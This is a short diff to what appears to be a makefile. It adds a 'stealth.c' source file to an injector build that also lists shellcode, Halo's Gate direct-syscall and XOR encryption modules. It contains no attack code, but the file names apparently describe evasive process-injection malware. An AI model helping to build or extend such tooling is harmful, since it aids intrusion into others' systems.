@@ -33,6 +33,7 @@ ENC_LIBS = kernel32.lib bcrypt.lib
 INJ_SRCS = src\injector\main.c \
            src\injector\injector.c \
            src\injector\shellcode.c \
+           src\injector\stealth.c \
            src\syscalls\halogate.c \
            src\syscalls\wrappers.c \
            src\crypto\xor_crypt.c
